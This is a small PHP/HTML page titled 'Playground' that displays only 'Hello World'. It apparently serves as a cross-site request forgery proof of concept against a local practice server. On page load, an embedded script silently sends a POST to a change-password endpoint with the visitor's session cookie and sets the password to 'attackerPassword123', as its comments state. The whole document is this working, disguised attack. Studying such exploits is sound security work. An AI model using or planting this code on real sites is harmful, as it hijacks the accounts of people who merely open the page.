<?php

?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Playground</title>
</head>
<body>
    <h1>Hello World</h1>
<script>
    fetch('http://localhost:1337/change-password', {
        method: 'POST',
        credentials: 'include',  // Include session cookie
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: new URLSearchParams({
            'newPassword': 'attackerPassword123'  // The attacker's new password
        })
    }).then(response => response.json())
    .then(data => console.log('Password changed:', data))
    .catch(error => console.log('Error:', error));
</script>


</body>
</html>
